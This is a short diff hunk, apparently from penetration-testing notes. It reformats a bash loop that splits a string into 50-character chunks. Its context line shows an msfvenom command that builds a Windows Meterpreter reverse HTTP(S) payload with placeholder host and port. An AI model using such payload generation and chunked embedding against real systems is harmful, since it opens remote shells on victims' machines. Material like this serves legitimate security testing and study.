@@ -20,9 +20,9 @@ $ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=<PORT> -f
 string=""
 chunks=50
 
-for ((i=0; i<${#string}; i+=chunks))
+for (( i=0; i<${#string}; i+=chunks ))
 do
-    if [[ i -eq 0 ]]
+    if [[ ${i} -eq 0 ]]
     then
         echo "string=\"${string:i:chunks}\""
     else
